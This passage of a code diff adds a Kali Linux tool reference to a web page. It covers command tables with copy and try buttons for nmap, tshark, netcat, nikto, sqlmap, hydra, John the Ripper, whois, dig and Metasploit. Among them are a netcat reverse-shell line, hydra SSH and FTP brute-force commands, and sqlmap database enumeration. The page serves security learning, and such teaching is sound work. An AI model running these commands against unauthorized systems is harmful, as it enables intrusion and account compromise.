@@ -543,51 +543,410 @@
                             <p>Browse and learn commands for popular Kali Linux security tools. Click any tool to see its commands, then use "TRY IN TERMINAL" to test them.</p>
                         </div>
                         <div id="kali-tools-grid" class="kali-tools-grid">
-                            <!-- Populated by JavaScript -->
+                            <div class="kali-category">
+                                <h3>Network Analysis</h3>
+                                <div class="kali-tools-list">
+                                    <div class="kali-tool-card" data-route="kali/nmap">
+                                        <div class="kali-tool-name">Nmap</div>
+                                        <div class="kali-tool-desc">Network scanner for discovering hosts and services</div>
+                                        <div class="kali-tool-count">10 commands</div>
+                                    </div>
+                                    <div class="kali-tool-card" data-route="kali/wireshark">
+                                        <div class="kali-tool-name">Wireshark/tshark</div>
+                                        <div class="kali-tool-desc">Network protocol analyzer for traffic capture</div>
+                                        <div class="kali-tool-count">5 commands</div>
+                                    </div>
+                                    <div class="kali-tool-card" data-route="kali/netcat">
+                                        <div class="kali-tool-name">Netcat</div>
+                                        <div class="kali-tool-desc">TCP/UDP Swiss Army Knife for networking</div>
+                                        <div class="kali-tool-count">5 commands</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="kali-category">
+                                <h3>Vulnerability Analysis</h3>
+                                <div class="kali-tools-list">
+                                    <div class="kali-tool-card" data-route="kali/nikto">
+                                        <div class="kali-tool-name">Nikto</div>
+                                        <div class="kali-tool-desc">Web server scanner for dangerous files</div>
+                                        <div class="kali-tool-count">5 commands</div>
+                                    </div>
+                                    <div class="kali-tool-card" data-route="kali/sqlmap">
+                                        <div class="kali-tool-name">SQLMap</div>
+                                        <div class="kali-tool-desc">SQL injection detection and exploitation</div>
+                                        <div class="kali-tool-count">5 commands</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="kali-category">
+                                <h3>Password Attacks</h3>
+                                <div class="kali-tools-list">
+                                    <div class="kali-tool-card" data-route="kali/hydra">
+                                        <div class="kali-tool-name">Hydra</div>
+                                        <div class="kali-tool-desc">Fast online password cracking tool</div>
+                                        <div class="kali-tool-count">5 commands</div>
+                                    </div>
+                                    <div class="kali-tool-card" data-route="kali/john">
+                                        <div class="kali-tool-name">John the Ripper</div>
+                                        <div class="kali-tool-desc">Password cracker for detecting weak passwords</div>
+                                        <div class="kali-tool-count">5 commands</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="kali-category">
+                                <h3>Information Gathering</h3>
+                                <div class="kali-tools-list">
+                                    <div class="kali-tool-card" data-route="kali/whois">
+                                        <div class="kali-tool-name">Whois</div>
+                                        <div class="kali-tool-desc">Domain and IP registration lookup</div>
+                                        <div class="kali-tool-count">3 commands</div>
+                                    </div>
+                                    <div class="kali-tool-card" data-route="kali/dig">
+                                        <div class="kali-tool-name">Dig</div>
+                                        <div class="kali-tool-desc">DNS lookup utility</div>
+                                        <div class="kali-tool-count">6 commands</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="kali-category">
+                                <h3>Exploitation</h3>
+                                <div class="kali-tools-list">
+                                    <div class="kali-tool-card" data-route="kali/metasploit">
+                                        <div class="kali-tool-name">Metasploit</div>
+                                        <div class="kali-tool-desc">Penetration testing framework</div>
+                                        <div class="kali-tool-count">6 commands</div>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
 
                 <!-- Kali Tool Detail Template (used for all individual tools) -->
+                <!-- NMAP -->
                 <div id="kali-nmap-tool" class="tool-panel kali-tool-detail" data-tool="nmap">
                     <h2>// NMAP</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Network Analysis</span>
+                                <h3>Network Mapper</h3>
+                                <p>Nmap is a free and open-source network scanner used to discover hosts and services on a computer network.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install nmap</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install nmap">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>nmap &lt;target&gt;</code></td><td>Basic scan - discovers open ports</td><td><code>nmap 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -sS &lt;target&gt;</code></td><td>TCP SYN scan (stealth)</td><td><code>nmap -sS 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -sS 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -sS 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -sV &lt;target&gt;</code></td><td>Service version detection</td><td><code>nmap -sV 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -sV 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -sV 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -O &lt;target&gt;</code></td><td>OS detection</td><td><code>nmap -O 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -O 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -O 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -A &lt;target&gt;</code></td><td>Aggressive scan (OS, version, scripts)</td><td><code>nmap -A 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -A 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -A 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -p &lt;ports&gt; &lt;target&gt;</code></td><td>Scan specific ports</td><td><code>nmap -p 22,80,443 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -p 22,80,443 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -p 22,80,443 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -p- &lt;target&gt;</code></td><td>Scan all 65535 ports</td><td><code>nmap -p- 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -p- 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -p- 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -sU &lt;target&gt;</code></td><td>UDP scan</td><td><code>nmap -sU 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -sU 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -sU 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nmap -sn &lt;network&gt;</code></td><td>Ping sweep (host discovery)</td><td><code>nmap -sn 192.168.1.0/24</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap -sn 192.168.1.0/24">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap -sn 192.168.1.0/24">TRY</button></td></tr>
+                                    <tr><td><code>nmap --script &lt;script&gt; &lt;target&gt;</code></td><td>Run NSE scripts</td><td><code>nmap --script vuln 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nmap --script vuln 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nmap --script vuln 192.168.1.1">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- WIRESHARK -->
                 <div id="kali-wireshark-tool" class="tool-panel kali-tool-detail" data-tool="wireshark">
                     <h2>// WIRESHARK</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Network Analysis</span>
+                                <h3>Network Protocol Analyzer</h3>
+                                <p>Wireshark captures and analyzes network traffic. tshark is its command-line equivalent.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install wireshark tshark</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install wireshark tshark">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>tshark -i &lt;interface&gt;</code></td><td>Capture on interface</td><td><code>tshark -i eth0</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="tshark -i eth0">COPY</button><button class="cyber-btn small try-btn" data-cmd="tshark -i eth0">TRY</button></td></tr>
+                                    <tr><td><code>tshark -i &lt;interface&gt; -w &lt;file&gt;</code></td><td>Capture and save to file</td><td><code>tshark -i eth0 -w capture.pcap</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="tshark -i eth0 -w capture.pcap">COPY</button><button class="cyber-btn small try-btn" data-cmd="tshark -i eth0 -w capture.pcap">TRY</button></td></tr>
+                                    <tr><td><code>tshark -r &lt;file&gt;</code></td><td>Read from pcap file</td><td><code>tshark -r capture.pcap</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="tshark -r capture.pcap">COPY</button><button class="cyber-btn small try-btn" data-cmd="tshark -r capture.pcap">TRY</button></td></tr>
+                                    <tr><td><code>tshark -D</code></td><td>List available interfaces</td><td><code>tshark -D</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="tshark -D">COPY</button><button class="cyber-btn small try-btn" data-cmd="tshark -D">TRY</button></td></tr>
+                                    <tr><td><code>tshark -i &lt;interface&gt; -c &lt;count&gt;</code></td><td>Capture specific number of packets</td><td><code>tshark -i eth0 -c 100</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="tshark -i eth0 -c 100">COPY</button><button class="cyber-btn small try-btn" data-cmd="tshark -i eth0 -c 100">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- NETCAT -->
                 <div id="kali-netcat-tool" class="tool-panel kali-tool-detail" data-tool="netcat">
                     <h2>// NETCAT</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Network Analysis</span>
+                                <h3>TCP/UDP Swiss Army Knife</h3>
+                                <p>Netcat (nc) is a versatile networking utility for reading/writing data across network connections.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install netcat-openbsd</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install netcat-openbsd">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>nc &lt;host&gt; &lt;port&gt;</code></td><td>Connect to a host and port</td><td><code>nc 192.168.1.1 80</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nc 192.168.1.1 80">COPY</button><button class="cyber-btn small try-btn" data-cmd="nc 192.168.1.1 80">TRY</button></td></tr>
+                                    <tr><td><code>nc -l -p &lt;port&gt;</code></td><td>Listen on a port</td><td><code>nc -l -p 4444</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nc -l -p 4444">COPY</button><button class="cyber-btn small try-btn" data-cmd="nc -l -p 4444">TRY</button></td></tr>
+                                    <tr><td><code>nc -lvp &lt;port&gt;</code></td><td>Listen verbosely</td><td><code>nc -lvp 4444</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nc -lvp 4444">COPY</button><button class="cyber-btn small try-btn" data-cmd="nc -lvp 4444">TRY</button></td></tr>
+                                    <tr><td><code>nc -z &lt;host&gt; &lt;port-range&gt;</code></td><td>Port scanning</td><td><code>nc -z 192.168.1.1 20-100</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nc -z 192.168.1.1 20-100">COPY</button><button class="cyber-btn small try-btn" data-cmd="nc -z 192.168.1.1 20-100">TRY</button></td></tr>
+                                    <tr><td><code>nc -e /bin/bash &lt;host&gt; &lt;port&gt;</code></td><td>Reverse shell</td><td><code>nc -e /bin/bash 10.0.0.1 4444</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nc -e /bin/bash 10.0.0.1 4444">COPY</button><button class="cyber-btn small try-btn" data-cmd="nc -e /bin/bash 10.0.0.1 4444">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- NIKTO -->
                 <div id="kali-nikto-tool" class="tool-panel kali-tool-detail" data-tool="nikto">
                     <h2>// NIKTO</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Vulnerability Analysis</span>
+                                <h3>Web Server Scanner</h3>
+                                <p>Nikto is an open-source web server scanner that tests for dangerous files and security issues.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install nikto</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install nikto">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>nikto -h &lt;host&gt;</code></td><td>Basic scan</td><td><code>nikto -h http://192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nikto -h http://192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="nikto -h http://192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>nikto -h &lt;host&gt; -p &lt;port&gt;</code></td><td>Scan specific port</td><td><code>nikto -h 192.168.1.1 -p 8080</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nikto -h 192.168.1.1 -p 8080">COPY</button><button class="cyber-btn small try-btn" data-cmd="nikto -h 192.168.1.1 -p 8080">TRY</button></td></tr>
+                                    <tr><td><code>nikto -h &lt;host&gt; -ssl</code></td><td>Force SSL mode</td><td><code>nikto -h 192.168.1.1 -ssl</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nikto -h 192.168.1.1 -ssl">COPY</button><button class="cyber-btn small try-btn" data-cmd="nikto -h 192.168.1.1 -ssl">TRY</button></td></tr>
+                                    <tr><td><code>nikto -h &lt;host&gt; -o &lt;file&gt;</code></td><td>Output to file</td><td><code>nikto -h 192.168.1.1 -o report.txt</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nikto -h 192.168.1.1 -o report.txt">COPY</button><button class="cyber-btn small try-btn" data-cmd="nikto -h 192.168.1.1 -o report.txt">TRY</button></td></tr>
+                                    <tr><td><code>nikto -update</code></td><td>Update plugins</td><td><code>nikto -update</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="nikto -update">COPY</button><button class="cyber-btn small try-btn" data-cmd="nikto -update">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- SQLMAP -->
                 <div id="kali-sqlmap-tool" class="tool-panel kali-tool-detail" data-tool="sqlmap">
                     <h2>// SQLMAP</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Vulnerability Analysis</span>
+                                <h3>SQL Injection Tool</h3>
+                                <p>SQLMap automates the detection and exploitation of SQL injection flaws.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install sqlmap</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install sqlmap">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>sqlmap -u URL</code></td><td>Test URL for SQL injection</td><td><code>sqlmap -u "http://site.com/page?id=1"</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="sqlmap -u &quot;http://site.com/page?id=1&quot;">COPY</button><button class="cyber-btn small try-btn" data-cmd="sqlmap -u &quot;http://site.com/page?id=1&quot;">TRY</button></td></tr>
+                                    <tr><td><code>sqlmap -u URL --dbs</code></td><td>Enumerate databases</td><td><code>sqlmap -u URL --dbs</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="sqlmap -u URL --dbs">COPY</button><button class="cyber-btn small try-btn" data-cmd="sqlmap -u URL --dbs">TRY</button></td></tr>
+                                    <tr><td><code>sqlmap -u URL -D db --tables</code></td><td>Enumerate tables</td><td><code>sqlmap -u URL -D testdb --tables</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="sqlmap -u URL -D testdb --tables">COPY</button><button class="cyber-btn small try-btn" data-cmd="sqlmap -u URL -D testdb --tables">TRY</button></td></tr>
+                                    <tr><td><code>sqlmap -u URL --batch</code></td><td>Non-interactive mode</td><td><code>sqlmap -u URL --batch</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="sqlmap -u URL --batch">COPY</button><button class="cyber-btn small try-btn" data-cmd="sqlmap -u URL --batch">TRY</button></td></tr>
+                                    <tr><td><code>sqlmap -r file</code></td><td>Load request from file</td><td><code>sqlmap -r request.txt</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="sqlmap -r request.txt">COPY</button><button class="cyber-btn small try-btn" data-cmd="sqlmap -r request.txt">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- HYDRA -->
                 <div id="kali-hydra-tool" class="tool-panel kali-tool-detail" data-tool="hydra">
                     <h2>// HYDRA</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Password Attacks</span>
+                                <h3>Login Cracker</h3>
+                                <p>Hydra is a fast online password cracking tool supporting numerous protocols.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install hydra</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install hydra">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>hydra -l user -P wordlist host ssh</code></td><td>SSH brute force</td><td><code>hydra -l admin -P wordlist.txt 192.168.1.1 ssh</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="hydra -l admin -P wordlist.txt 192.168.1.1 ssh">COPY</button><button class="cyber-btn small try-btn" data-cmd="hydra -l admin -P wordlist.txt 192.168.1.1 ssh">TRY</button></td></tr>
+                                    <tr><td><code>hydra -L users -P wordlist host ssh</code></td><td>Multiple users SSH</td><td><code>hydra -L users.txt -P pass.txt 192.168.1.1 ssh</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="hydra -L users.txt -P pass.txt 192.168.1.1 ssh">COPY</button><button class="cyber-btn small try-btn" data-cmd="hydra -L users.txt -P pass.txt 192.168.1.1 ssh">TRY</button></td></tr>
+                                    <tr><td><code>hydra -l user -P wordlist ftp://host</code></td><td>FTP brute force</td><td><code>hydra -l admin -P wordlist.txt ftp://192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="hydra -l admin -P wordlist.txt ftp://192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="hydra -l admin -P wordlist.txt ftp://192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>hydra -t threads ...</code></td><td>Set parallel tasks</td><td><code>hydra -t 16 -l admin -P pass.txt 192.168.1.1 ssh</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="hydra -t 16 -l admin -P pass.txt 192.168.1.1 ssh">COPY</button><button class="cyber-btn small try-btn" data-cmd="hydra -t 16 -l admin -P pass.txt 192.168.1.1 ssh">TRY</button></td></tr>
+                                    <tr><td><code>hydra -V ...</code></td><td>Verbose output</td><td><code>hydra -V -l admin -P pass.txt 192.168.1.1 ssh</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="hydra -V -l admin -P pass.txt 192.168.1.1 ssh">COPY</button><button class="cyber-btn small try-btn" data-cmd="hydra -V -l admin -P pass.txt 192.168.1.1 ssh">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- JOHN -->
                 <div id="kali-john-tool" class="tool-panel kali-tool-detail" data-tool="john">
                     <h2>// JOHN</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Password Attacks</span>
+                                <h3>Password Cracker</h3>
+                                <p>John the Ripper is a fast password cracker for detecting weak passwords.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install john</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install john">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>john hashfile</code></td><td>Crack password hashes</td><td><code>john hashes.txt</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="john hashes.txt">COPY</button><button class="cyber-btn small try-btn" data-cmd="john hashes.txt">TRY</button></td></tr>
+                                    <tr><td><code>john --wordlist=file hashfile</code></td><td>Dictionary attack</td><td><code>john --wordlist=rockyou.txt hashes.txt</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="john --wordlist=rockyou.txt hashes.txt">COPY</button><button class="cyber-btn small try-btn" data-cmd="john --wordlist=rockyou.txt hashes.txt">TRY</button></td></tr>
+                                    <tr><td><code>john --format=type hashfile</code></td><td>Specify hash format</td><td><code>john --format=raw-md5 hashes.txt</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="john --format=raw-md5 hashes.txt">COPY</button><button class="cyber-btn small try-btn" data-cmd="john --format=raw-md5 hashes.txt">TRY</button></td></tr>
+                                    <tr><td><code>john --show hashfile</code></td><td>Show cracked passwords</td><td><code>john --show hashes.txt</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="john --show hashes.txt">COPY</button><button class="cyber-btn small try-btn" data-cmd="john --show hashes.txt">TRY</button></td></tr>
+                                    <tr><td><code>john --list=formats</code></td><td>List supported formats</td><td><code>john --list=formats</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="john --list=formats">COPY</button><button class="cyber-btn small try-btn" data-cmd="john --list=formats">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- WHOIS -->
                 <div id="kali-whois-tool" class="tool-panel kali-tool-detail" data-tool="whois">
                     <h2>// WHOIS</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Information Gathering</span>
+                                <h3>Domain Information Lookup</h3>
+                                <p>Whois queries databases for domain and IP registration information.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install whois</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install whois">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>whois domain</code></td><td>Domain lookup</td><td><code>whois example.com</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="whois example.com">COPY</button><button class="cyber-btn small try-btn" data-cmd="whois example.com">TRY</button></td></tr>
+                                    <tr><td><code>whois ip</code></td><td>IP address lookup</td><td><code>whois 8.8.8.8</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="whois 8.8.8.8">COPY</button><button class="cyber-btn small try-btn" data-cmd="whois 8.8.8.8">TRY</button></td></tr>
+                                    <tr><td><code>whois domain | grep "name server"</code></td><td>Get name servers</td><td><code>whois example.com | grep "name server"</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="whois example.com | grep &quot;name server&quot;">COPY</button><button class="cyber-btn small try-btn" data-cmd="whois example.com | grep &quot;name server&quot;">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- DIG -->
                 <div id="kali-dig-tool" class="tool-panel kali-tool-detail" data-tool="dig">
                     <h2>// DIG</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Information Gathering</span>
+                                <h3>DNS Lookup Utility</h3>
+                                <p>Dig is a flexible tool for interrogating DNS name servers.</p>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install dnsutils</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install dnsutils">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>dig domain</code></td><td>Basic DNS lookup</td><td><code>dig example.com</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="dig example.com">COPY</button><button class="cyber-btn small try-btn" data-cmd="dig example.com">TRY</button></td></tr>
+                                    <tr><td><code>dig domain ANY</code></td><td>Query all record types</td><td><code>dig example.com ANY</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="dig example.com ANY">COPY</button><button class="cyber-btn small try-btn" data-cmd="dig example.com ANY">TRY</button></td></tr>
+                                    <tr><td><code>dig domain MX</code></td><td>Query MX records</td><td><code>dig example.com MX</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="dig example.com MX">COPY</button><button class="cyber-btn small try-btn" data-cmd="dig example.com MX">TRY</button></td></tr>
+                                    <tr><td><code>dig @server domain</code></td><td>Query specific DNS server</td><td><code>dig @8.8.8.8 example.com</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="dig @8.8.8.8 example.com">COPY</button><button class="cyber-btn small try-btn" data-cmd="dig @8.8.8.8 example.com">TRY</button></td></tr>
+                                    <tr><td><code>dig +short domain</code></td><td>Short output (IP only)</td><td><code>dig +short example.com</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="dig +short example.com">COPY</button><button class="cyber-btn small try-btn" data-cmd="dig +short example.com">TRY</button></td></tr>
+                                    <tr><td><code>dig -x ip</code></td><td>Reverse DNS lookup</td><td><code>dig -x 8.8.8.8</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="dig -x 8.8.8.8">COPY</button><button class="cyber-btn small try-btn" data-cmd="dig -x 8.8.8.8">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+
+                <!-- METASPLOIT -->
                 <div id="kali-metasploit-tool" class="tool-panel kali-tool-detail" data-tool="metasploit">
                     <h2>// METASPLOIT</h2>
-                    <div class="tool-interface"><p>Loading tool data...</p></div>
+                    <div class="tool-interface">
+                        <div class="kali-tool-header">
+                            <div class="kali-tool-info">
+                                <span class="kali-badge">Exploitation</span>
+                                <h3>Penetration Testing Framework</h3>
+                                <p>Metasploit Framework is a powerful penetration testing platform.</p>
+                                <div class="kali-note">⚠️ Metasploit requires proper setup. Use msfdb init to initialize.</div>
+                            </div>
+                            <div class="kali-install">
+                                <label>INSTALLATION:</label>
+                                <code>apt install metasploit-framework</code>
+                                <button class="cyber-btn small copy-btn" data-copy="apt install metasploit-framework">COPY</button>
+                            </div>
+                        </div>
+                        <h3>COMMANDS REFERENCE</h3>
+                        <div class="kali-commands-table">
+                            <table>
+                                <thead><tr><th>COMMAND</th><th>DESCRIPTION</th><th>EXAMPLE</th><th>ACTIONS</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code>msfconsole</code></td><td>Start Metasploit console</td><td><code>msfconsole</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="msfconsole">COPY</button><button class="cyber-btn small try-btn" data-cmd="msfconsole">TRY</button></td></tr>
+                                    <tr><td><code>search keyword</code></td><td>Search for exploits</td><td><code>search type:exploit smb</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="search type:exploit smb">COPY</button><button class="cyber-btn small try-btn" data-cmd="search type:exploit smb">TRY</button></td></tr>
